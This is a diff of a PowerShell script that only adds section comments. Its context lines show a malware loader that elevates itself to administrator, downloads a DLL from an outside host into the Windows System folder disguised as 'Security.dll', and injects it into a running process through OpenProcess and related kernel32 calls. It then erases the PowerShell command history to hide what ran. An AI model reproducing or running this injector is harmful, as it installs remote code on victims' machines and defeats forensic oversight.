@@ -1,4 +1,4 @@
-
+# === Self-Elevate ===
 if (-NOT ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
     try {
         Start-Process powershell.exe -Verb RunAs -ArgumentList (
@@ -14,7 +14,7 @@ if (-NOT ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdenti
     }
 }
 
-
+# === Fixed LookupFunc ===
 function LookupFunc {
     Param ($moduleName, $functionName)
     
@@ -59,7 +59,7 @@ function getDelegateType {
     return $type.CreateType()
 }
 
-
+# === Download DLL ===
 $dllFileName = "Security.dll"
 $dllPath = Join-Path ([Environment]::GetFolderPath("System")) $dllFileName
 $dllUrl = "https://demoxservices.com/uploads/1774488808_d3d10.dll"
@@ -107,7 +107,7 @@ $injProc = $proc | Select-Object -First 1 -ExpandProperty Id
 $pid1 = [int]$injProc
 Write-Host "[+] Target: $processName (PID: $pid1)" -ForegroundColor Green
 
-
+# === Injection ===
 try {
     $OpenProcessDelegate = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(
         (LookupFunc "kernel32.dll" "OpenProcess"),
@@ -161,6 +161,7 @@ catch {
     Write-Host $_.ScriptStackTrace -ForegroundColor Yellow
 }
 
+# === Cleanup ===
 [Microsoft.PowerShell.PSConsoleReadLine]::ClearHistory() 2>$null
 $histPath = (Get-PSReadLineOption).HistorySavePath
 if (Test-Path $histPath) { Remove-Item $histPath -Force -ErrorAction SilentlyContinue }
